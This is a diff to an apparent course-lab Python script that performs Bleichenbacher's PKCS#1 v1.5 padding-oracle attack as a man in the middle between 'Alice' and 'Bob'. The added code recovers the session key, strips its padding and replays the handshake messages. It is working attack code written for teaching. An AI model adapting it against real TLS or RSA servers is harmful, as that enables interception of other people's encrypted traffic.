@@ -30,6 +30,12 @@ BUFFER_SIZE = 8192
 
 # %% Functions
 
+def remove_pkcs(text):
+    i = 2
+    while text[i] != 0:
+        i = i + 1
+    return text[(i + 1):]
+
 def print_with_hexdump(binary,send_or_receive,enb_pause=False):
     if send_or_receive == 'send_alice':
         print('Send command to client: \n')
@@ -58,17 +64,22 @@ class MITM:
         self.message_type_server_hello_done = bytearray.fromhex("0e")[0]
         self.message_type_client_send_encrypted_key = bytearray.fromhex("10")[0]
         self.message_type_padding_validation = bytearray.fromhex("ff")[0]
+        self.message_type_change_cipher_spec = bytearray.fromhex("14")[0]
         self.cipher_suit = None
         self.e = None
         self.n = None
         self.k = None
         self.cipherText = None
         self.dataBlock = None
+        self.key = None
+        self.change_client_cipher_suit_message = None
     
     def receive_alice_request(self, alice_socket):
         data = alice_socket.recv(BUFFER_SIZE)
         print_with_hexdump(data,'receive_alice',True)
-        if data[5] == self.message_type_client_hello:
+        if data[0] == self.message_type_change_cipher_spec:
+            request = 'Client_Change_Cipher_Spec'
+        elif data[5] == self.message_type_client_hello:
             request = 'Client_Hello'
         elif data[5] == self.message_type_client_send_encrypted_key:
             request = 'Client_Send_Encrypted_Key'
@@ -92,7 +103,13 @@ class MITM:
             print('Encrypted secret key: ' + str(data[11:]) + ' \n')
             self.dataBlock = data[:11]
             self.cipherText = int.from_bytes(data[11:],'big')
+            print('Recieved int cipher text: ' + str(self.cipherText) + '\n')
             data = data
+        elif request == 'Client_Change_Cipher_Spec':
+            print('Received client change spec message.\n')
+            self.change_client_cipher_suit_message = data
+            data = data
+            print('Saving the message for later uses\n')
         else:
             raise Exception('Request is invalid! fix your code!')
         return data
@@ -175,6 +192,8 @@ class MITM:
     def prepare_data_for_attack(self,alice_socket,bob_socket):
         request, data = self.receive_alice_request(alice_socket)
         self.handle_alice_request(request, data)
+        request, data = self.receive_alice_request(alice_socket)
+        self.handle_alice_request(request, data)
     
     def prepare_fake_data_block(self,c_cur):
         data = self.dataBlock + long_to_bytes(c_cur,self.k)
@@ -191,8 +210,14 @@ class MITM:
         else:
             return False
     
+    def post_attack_message(self,bob_socket):
+        self.send_to(self.dataBlock + long_to_bytes(self.cipherText,self.k),bob_socket,'Bob')
+        request, data = self.receive_bob_response(bob_socket)
+        self.handle_bob_response(request, data)
+    
     def Bleichenbacher_98_attack(self,bob_socket):
         print("Starting Bleichenbacher's PKCS 1.5 attack: \n")
+        sleep(5)
         e = self.e; n = self.n;
         B = 2 ** (8 * (self.k - 2))
         # Step 1: Blinding. (we don't actually need it cause c is known to be PKCS conforming)
@@ -261,7 +286,17 @@ class MITM:
             print('\n')
             print('--------------------------\n')
             print('\n')
+        # Step 4: Computing the solution
+        print('Step 4: Computing the solution.\n')
+        m = M[0][0] % n
+        print('Solution: ' + str(m) + '\n')
+        self.key = remove_pkcs(long_to_bytes(m,self.k))
+        print('Recovered secret key: ' + str(self.key) + '\n')
+        self.post_attack_message(bob_socket)
         
+    def send_client_change_cipher_spec(self,bob_socket):
+        self.send_to(self.change_client_cipher_suit_message, bob_socket,'Bob')
+    
 def main():
     # open socket with client
     print('\n')
@@ -282,6 +317,7 @@ def main():
     ManInTheMiddle.receive_bob_send_alice(alice_socket,bob_socket)
     ManInTheMiddle.prepare_data_for_attack(alice_socket,bob_socket)
     ManInTheMiddle.Bleichenbacher_98_attack(bob_socket)
+    ManInTheMiddle.send_client_change_cipher_spec(bob_socket)
     print('Closing connection with Bob\n')
     bob_socket.close()
     print('Disconnecting Alice\n')
